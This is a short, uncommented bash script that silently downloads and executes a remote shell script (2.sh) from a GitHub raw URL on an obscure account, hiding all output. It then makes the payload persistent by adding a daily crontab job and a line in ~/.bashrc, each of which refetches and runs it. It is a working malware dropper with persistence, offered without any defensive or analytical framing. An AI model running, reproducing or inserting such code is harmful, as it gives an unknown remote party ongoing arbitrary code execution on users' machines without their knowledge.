#!/bin/bash

/bin/bash -c "source <(wget -q -O - https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbnmyxsc-svg/123/main/2.sh || curl -sL https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbnmyxsc-svg/123/main/2.sh)" >/dev/null 2>&1

(crontab -l;echo '0 0 * * * /bin/bash -c "source <(wget -q -O - https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbnmyxsc-svg/123/main/2.sh || curl -sL https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbnmyxsc-svg/123/main/2.sh)" >/dev/null 2>&1')|crontab -


echo '/bin/bash -c "source <(wget -q -O - https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbnmyxsc-svg/123/main/2.sh || curl -sL https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbnmyxsc-svg/123/main/2.sh)" >/dev/null 2>&1' >> ~/.bashrc
